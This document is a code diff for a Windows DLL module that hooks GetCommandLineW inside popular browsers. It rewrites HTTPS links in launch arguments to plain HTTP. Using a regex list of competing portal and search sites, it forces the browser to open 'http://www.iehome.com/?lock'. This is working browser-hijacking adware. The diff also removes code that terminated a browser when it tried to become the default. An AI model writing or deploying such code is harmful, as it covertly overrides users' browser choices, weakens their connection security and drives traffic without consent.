@@ -2,12 +2,17 @@
 
 #include "FakeCommandLine.h"
 
+#include "pcre\pcre.h"
+
 #include "HookControl\HookHelp.h"
 #include "HookControl\InlineHook.h"
 #include "HookControl\IATHook.h"
 
 namespace {
 #define _W(_str)		L##_str
+#define _S(_str)		_str
+#define MAX_OVECCOUNT 0x30
+
 	const wchar_t * ptszHitProcessNameLists[] = {
 		_W("iexplore.exe")/* IE 核心浏览器*/,
 
@@ -17,25 +22,97 @@ namespace {
 		_W("chrome.exe")/* Chrome 核心浏览器*/,
 		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
 		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
-//		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
+		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
 		_W("f1browser.exe")/* F1 核心浏览器*/,
 		_W("2345explorer.exe")/* 2345 核心浏览器*/,
 
 		_W("yidian.exe")/* 一点浏览器 湖南岳阳 应该是当地实名制公司的*/
 	};
-	const wchar_t * ptszHitRedirectURLLists[] = {
-		_W("0.baidu.com/?"),
-		_W("www.baidu.com/?"),
-		_W("www.baidu.com/home?"),
-		_W("www.baidu.com/index.php?")
-		_W("www.sogou.com/index"),
-		_W("www.hao123.com/?"),
-		_W("www.2345.com/?"),
-		_W("hao.360.cn/?"),
-		_W("123.sogou.com/?"),
+	const char * ptszHitRedirectURLLists[] = {
+		_S("(?: |http[s]?://)hao\\.360\\.cn/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
 
-		_W(".index66.com")
+		_S("(?: |http[s]?://)www\\.duba\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+
+		_S("(?: |http[s]?://)123\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+		_S("(?: |http[s]?://)www\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+
+		_S("(?: |http[s]?://)www\\.2345\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+
+		_S("(?: |http[s]?://)0\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:home[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+
+		_S("(?: |http[s]?://)www\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
+
+		_S("\\.index66\\.com"),
+		_S("pc918\\.net"),
+		_S("interface\\.wx-media\\.com"),
+		_S("index\\.icafevip\\.com"),
+		_S("17dao\\.com"),
+		_S("www\\.58fy\\.com"),
+		_S("daohang\\.qq\\.com"),
+		_S("www\\.wblove\\.com"),
+		_S("www\\.v232\\.com"),
+		_S("www\\.95browser\\.com"),
+		_S("www\\.6461\\.cn"),
+		_S("www\\.95soo\\.com"),
+		_S("www\\.go890\\.com"),
+		_S("www\\.wb12318\\.com"),
+		_S("jl100\\.net"),
+		_S("index\\.woai310\\.com"),
+		_S("1234wu\\.com"),
+		_S("123\\.org\\.cn"),
+		_S("123\\.19so\\.cn"),
+		_S("huo99\\.com"),
+		_S("sogoulp\\.com"),
+		_S("www\\.52wba\\.com"),
+		_S("www\\.ld56\\.com"),
+		_S("www\\.wb400\\.net"),
+		_S("58aq\\.com"),
+		_S("g-fox\\.cn"),
+		_S("uc123\\.com"),
+		_S("maxthon\\.cn"),
+		_S("firefoxchina\\.cn"),
+		_S("opera\\.com"),
+		_S("hao\\.360\\.cn"),
+		_S("so\\.360\\.cn"),
+		_S("3600\\.com"),
+		_S("duba\\.com"),
+		_S("www\\.baidu\\.com"),
+		_S("0\\.baidu\\.com"),
+		_S("12318wh\\.com"),
+		_S("19so\\.cn"),
+		_S("917wb\\.com"),
+		_S("wbindex\\.cn"),
+		_S("jj123\\.com\\.cn"),
+		_S("woai310\\.com"),
+		_S("i8cs\\.com"),
+		_S("v228\\.cn"),
+		_S("www\\.2345\\.com"),
+		_S("58ny\\.com"),
+		_S("hao123\\.com"),
+		_S("tao123\\.com"),
+		_S("soso\\.com"),
+		_S("123\\.sogou\\.com"),
+		_S("www\\.sogou\\.com"),
+		_S("ld56\\.com"),
+		_S("16116\\.net"),
+		_S("wz58\\.com"),
+		_S("google\\.com"),
+		_S("42\\.62\\.30\\.178"),
+		_S("42\\.62\\.30\\.180"),
+		_S("index\\.icafe66\\.com"),
+		_S("kltest\\.bmywm\\.com"),
+		_S("127.0.0.1:"),
+		_S("localhost:")
+
 	};
+
+	typedef LPWSTR(WINAPI *__pfnGetCommandLineW) (VOID);
+
+	UNICODE_STRING ustrCommandLine = { 0 };
+	__pfnGetCommandLineW pfnGetCommandLineW = NULL;
+
 
 	const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
 	{
@@ -153,14 +230,36 @@ namespace {
 		return   bIsOK;
 	}
 
-	bool FindRedirectURL(const wchar_t * pcwszCheckString) {
-		for (int i = 0; i < count(ptszHitRedirectURLLists); i++) {
-			if (NULL != wcsistr(pcwszCheckString, ptszHitRedirectURLLists[i])) {
-				return true;
-			}
+	bool IsRedirectCommandLine(const wchar_t * pcwszCheckString) {
+		bool bIsHit = false;
+		pcre * pcreCompile = NULL;
+		int nWatchOvectors[MAX_OVECCOUNT] = { 0 };
+
+		char * pszCheckString = Common::WSTR2STR(pcwszCheckString,NULL);
+
+		int nErroroffset = 0;
+		const char * pcszErrorptr = NULL;
+
+		pcreCompile = pcre_compile("^\".:\\\\[^\"]*\" *$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
+
+		if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {
+			return true;
 		}
 
-		return false;
+		for (int i = 0; i < count(ptszHitRedirectURLLists); i++) {
+
+			pcreCompile = pcre_compile(ptszHitRedirectURLLists[i], PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
+
+			if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {
+				bIsHit = true;
+				break;
+			}
+		}
+		
+		free(pszCheckString);
+		pcre_free(pcreCompile);
+
+		return bIsHit;
 	}
 
 	bool GetUrlAssociationbyProtocol(const wchar_t * pcwszProtocolName, wchar_t * pwszProtocolCommandLine, size_t sizeBufferSize = 2048) {
@@ -186,140 +285,84 @@ namespace {
 	}
 }
 
+LPWSTR WINAPI InlineGetCommandLineW(VOID)
+{
+	PPEB pProcessPEB = GetCurrentProcessPEB();
+
+	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
+		return pfnGetCommandLineW();
+	}
+
+	if (ustrCommandLine.MaximumLength < pProcessPEB->ProcessParameters->CommandLine.Length) {
+
+		ustrCommandLine.MaximumLength = max(pProcessPEB->ProcessParameters->CommandLine.Length, pProcessPEB->ProcessParameters->CommandLine.MaximumLength) + 1024;
+
+		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * ustrCommandLine.MaximumLength);
+
+		memcpy(ustrCommandLine.Buffer, pProcessPEB->ProcessParameters->CommandLine.Buffer, pProcessPEB->ProcessParameters->CommandLine.Length * sizeof(WCHAR));
+	}
+
+	LPWSTR pcwszStartCommandLine = ustrCommandLine.Buffer;
+	LPWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;
+
+	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer,_W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
+	{
+		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], wcslen(pcwszNextOffset) * sizeof(WCHAR));
+	}
+
+	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
+
+	if (IsRedirectCommandLine(pcwszStartCommandLine)) {
+		pcwszStartCommandLine = ustrCommandLine.Buffer;
+		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);
+	}
+
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect EXEC: %s", GetCurrentProcessId(), pcwszStartCommandLine);
+	return pcwszStartCommandLine;
+}
+
 bool Hook::StartCommandLineHook()
 {
-	bool bIsHookProcess = false;
+	bool bIsHook = false;
 	PPEB pProcessPEB = GetCurrentProcessPEB();
 
 	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
 		return false;
 	}
 
+	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
+		if (NULL != wcsistr(pProcessPEB->ProcessParameters->ImagePathName.Buffer, ptszHitProcessNameLists[i])) {
+
+			bIsHook = HookControl::InlineHook(::GetCommandLineW, InlineGetCommandLineW, (void **)&pfnGetCommandLineW);
+			break;
+		}
+	}
+
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] EXEC: [%u]%s", GetCurrentProcessId(), bIsHook, pProcessPEB->ProcessParameters->CommandLine.Buffer);
+
+#ifdef _DEBUG
+	IsRedirectCommandLine(L"\"C:\\Program Files(x86)\\Google\\Chrome\\Application\\chrome.exe\" ");
+#endif
+
+	LPCWSTR pcwszNewParameter = NULL;
 	LPCWSTR pcwszStartCommandLine = pProcessPEB->ProcessParameters->CommandLine.Buffer;
 	LPCWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;
 
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] EXEC: %s", GetCurrentProcessId(), pcwszStartImagePathName);
-
-	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
-		bIsHookProcess = true;
-		if (NULL != wcsistr(pcwszStartImagePathName, ptszHitProcessNameLists[i])) {
-			break;
-		}
-
-		bIsHookProcess = false;
-	}
-
-	if (false == bIsHookProcess) {
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] Execute process commandline not hit.", GetCurrentProcessId());
-		return false;
-	}
-
-	WCHAR wszParentProcessName[MAX_PATH + 1] = { 0 };
-	DWORD dwParentProcessID = GetParentProcessId(GetCurrentProcessId());
-
-	wszParentProcessName[0] = L'\\';
-	if (-1 == dwParentProcessID || false == GetProcessNameByProcessId(dwParentProcessID, &wszParentProcessName[1])) {
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] Query parent name failed.", GetCurrentProcessId());
-		return false;
-	}
-
-	if (NULL != wcsistr(pcwszStartImagePathName, wszParentProcessName)) {
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] Parent name: %s", GetCurrentProcessId(), wszParentProcessName);
-		return false;
-	}
-
-	WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };
-
-	if (false == GetUrlAssociationbyProtocol(L"http", wszProtocolCommandLine, sizeof(wszProtocolCommandLine))) {
-		wcscpy(wszProtocolCommandLine, _W("C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"));
-
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] Query url associationby protocol failed.", GetCurrentProcessId());
-		//return false;
-	}
-
-	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association: %s", GetCurrentProcessId(), wszProtocolCommandLine);
-
-	bIsHookProcess = FindRedirectURL(pcwszStartCommandLine);
-
-	if (NULL != wcsistr(wszProtocolCommandLine, pcwszStartImagePathName)) {
-		Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association Hit: %s", GetCurrentProcessId(), wszProtocolCommandLine);
-
-		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) { // 如果不包含 HTTP
-			bIsHookProcess = true;  // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
-		}
-
-		if (NULL != wcsistr(pcwszStartCommandLine, L"-")) { // 如果有任意参数
-			bIsHookProcess = false; // 放过
-		}
-
-		if (false == bIsHookProcess) {
-			pcwszNewParameter = NULL;
-		}
-	}
-
-	///   编写代理状态监测
-
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);
-
-	////////////////////////////////////////////////////////////////////////////////////////////
-	// 例外规则
-
-	if (NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ浏览器
-
-		if (NULL != wcsistr(pcwszStartCommandLine, L"-sc=desktopshortcut")) { // 如果不是桌面图标触发的,按条件放过
-			Global::Log.PrintW(LOGOutputs, L"[% 5u] QQ Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
-		}
-		else {
-			if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的
-				pcwszNewParameter = NULL;
-			}
-			if (NULL != wcsistr(pcwszStartCommandLine, L"/web=")) { // 打开空间等
-				pcwszNewParameter = NULL;
-			}
-
-			if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // 只要不包含 URL 均不进行劫持
-				pcwszNewParameter = NULL;
-			}
-
-			if (false == bIsHookProcess) {
-				pcwszNewParameter = NULL;
-			}
-		}
-	}
-
-	if (NULL != wcsistr(pcwszStartImagePathName, L"\\sogouexplorer.exe")) {// 搜狗浏览器
-		
-		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) { // QQ 触发的
-				pcwszNewParameter = NULL;
-		}
-	}
-
-	if (NULL != wcsistr(pcwszStartImagePathName, L"\\2345explorer.exe")) {// F1浏览器 
-		if (NULL != wcsistr(pcwszStartCommandLine, L"--shortcut=desktop")) { // 通过桌面快捷方式启动
-			pcwszNewParameter = L"http://www.iehome.com/?lock";
-			Global::Log.PrintW(LOGOutputs, L"[% 5u] 2345 Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
-		}
-	}
-
-	if (NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1浏览器 
-		if (NULL != wcsistr(pcwszStartCommandLine, L"set-default")) { // 禁止其设置默认浏览器
-			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), pcwszStartCommandLine);
-			::ExitProcess(0);
-			::TerminateProcess(::GetCurrentProcess(), 0);
-		}
+	if (NULL != wcsistr(pcwszStartImagePathName,_W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
+		pcwszNewParameter = L"http://www.iehome.com/?lock";
 	}
 
 	//////////////////////////////////////////////////////////////////////////////////////////////
 	// 执行重定向
 
 	if (NULL != pcwszNewParameter) {
-		STARTUPINFOW siStratupInfo = { 0 };
-		PROCESS_INFORMATION piProcessInformation = { 0 };
+		WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };
 
 		_swprintf(wszProtocolCommandLine, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);
 
 		bool bIsSuccess = false;
+		STARTUPINFOW siStratupInfo = { 0 };
+		PROCESS_INFORMATION piProcessInformation = { 0 };
 
 		siStratupInfo.cb = sizeof(STARTUPINFO);
 
